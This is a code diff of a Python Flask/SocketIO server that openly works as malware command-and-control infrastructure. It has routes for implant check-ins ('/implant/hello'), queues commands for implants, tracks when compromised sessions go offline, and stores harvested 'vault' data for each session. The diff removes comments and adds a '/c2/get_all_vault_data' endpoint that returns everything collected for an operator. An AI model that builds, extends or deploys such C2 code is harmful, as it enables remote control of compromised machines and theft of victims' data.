@@ -7,7 +7,7 @@ import time
 import threading
 import logging
 import psycopg2
-import random  # <-- FIXED: Added the missing import for random.randint()
+import random
 from flask import Flask, request, jsonify
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from flask_limiter import Limiter
@@ -23,7 +23,6 @@ SERVER_START_TIME = datetime.utcnow()
 DATABASE_URL = os.environ.get('DATABASE_URL')
 
 # --- Logging Setup ---
-# Added more detailed logging format
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] [Line:%(lineno)d] %(message)s',
@@ -60,7 +59,6 @@ class DatabaseManager:
             self.setup_schema()
         except psycopg2.Error as e:
             logging.critical(f"DatabaseManager failed to connect: {e}")
-            # In a real app, you might want a retry mechanism here
             self.conn = None
 
     def _execute(self, query, params=None, fetch=None):
@@ -77,7 +75,6 @@ class DatabaseManager:
             return True
         except psycopg2.Error as e:
             logging.error(f"Database execute error: {e}")
-            # Re-establish connection on failure
             self.conn = psycopg2.connect(DATABASE_URL)
             self.conn.autocommit = True
             return None
@@ -96,19 +93,14 @@ class DatabaseManager:
 
     def sanitize_data_for_user(self, username):
         logging.warning(f"Sanitizing all session and vault data for user: {username}")
-        if self._execute("DELETE FROM sessions WHERE owner_username = %s", (username,)):
-            return True
-        return False
+        return bool(self._execute("DELETE FROM sessions WHERE owner_username = %s", (username,)))
 
     def delete_user_account(self, username):
         logging.warning(f"Permanently deleting user account and all associated data for: {username}")
-        if self._execute("DELETE FROM users WHERE username = %s", (username,)):
-            return True
-        return False
+        return bool(self._execute("DELETE FROM users WHERE username = %s", (username,)))
 
     def create_user(self, username, password_hash):
         logging.info(f"Attempting to create user: {username}")
-        # The assigned line number is generated using random.randint()
         assigned_line = random.randint(1, 10)
         query = "INSERT INTO users (username, password_hash, assigned_line, last_login) VALUES (%s, %s, %s, %s)"
         params = (username, password_hash, assigned_line, datetime.utcnow())
@@ -147,11 +139,11 @@ class DatabaseManager:
 
     def load_vault_data_for_user(self, username):
         sessions_rows = self._execute("SELECT session_id, metadata, alias FROM sessions WHERE owner_username = %s", (username,), fetch='all')
-        if sessions_rows is None: return {} # Handle query failure
+        if sessions_rows is None: return {}
         vault_data = {sid: {"metadata": metadata or {}, "alias": alias} for sid, metadata, alias in sessions_rows}
         if not vault_data: return {}
         vault_rows = self._execute("SELECT session_id, module_name, data FROM vault WHERE session_id IN %s", (tuple(vault_data.keys()),), fetch='all')
-        if vault_rows is None: return vault_data # Return partial data if vault query fails
+        if vault_rows is None: return vault_data
         for sid, mod_name, data_json in vault_rows:
             if sid in vault_data: vault_data[sid][mod_name] = data_json
         return vault_data
@@ -230,6 +222,18 @@ def handle_c2_sanitize():
     else:
         return jsonify({"success": False, "error": "A database error occurred during sanitation."}), 500
 
+# --- THE BUG FIX IS HERE ---
+@app.route('/c2/get_all_vault_data', methods=['POST'])
+def handle_get_all_vault_data():
+    username = request.json.get("username")
+    if not username:
+        return jsonify({"success": False, "error": "Username is required"}), 400
+    
+    all_data = db.load_vault_data_for_user(username)
+    logging.info(f"Fetched all vault data for user '{username}'. Found {len(all_data)} sessions.")
+    
+    return jsonify({"success": True, "data": all_data})
+# --- END OF BUG FIX ---
 
 @app.route('/implant/hello', methods=['POST'])
 def handle_implant_hello():
@@ -252,21 +256,16 @@ def handle_implant_hello():
         commands_to_send = command_queue.get(c2_user, {}).pop(sid, [])
     return jsonify({"commands": commands_to_send})
 
-# The rest of your socketio event handlers would go here if you add more
-# e.g. @socketio.on('connect'), @socketio.on('join_c2'), etc.
-
 if __name__ == '__main__':
     def start_cleanup_scheduler():
-        # Schedule the first run and then subsequent runs
         def job():
             db.find_and_delete_inactive_users()
             threading.Timer(CLEANUP_INTERVAL_SECONDS, job).start()
-        # Initial call
         job()
 
     def check_offline_implants():
         while True:
-            time.sleep(15) # Check every 15 seconds
+            time.sleep(15)
             with session_lock:
                 offline_sids = [sid for sid, data in active_sessions.items() if time.time() - data.get("last_seen", 0) > SESSION_TIMEOUT_SECONDS]
                 for sid in offline_sids:
@@ -274,12 +273,9 @@ if __name__ == '__main__':
                     if owner:
                         socketio.emit('session_updated', {'session_id': sid, 'status': 'Offline'}, room=owner)
     
-    # Start background threads
     threading.Thread(target=start_cleanup_scheduler, daemon=True).start()
     threading.Thread(target=check_offline_implants, daemon=True).start()
     
-    # Get port from environment variables, default to 5001 for local testing
     port = int(os.environ.get('PORT', 5001))
     
-    # Use gunicorn's recommendation for production, but this works for Render's environment
     socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
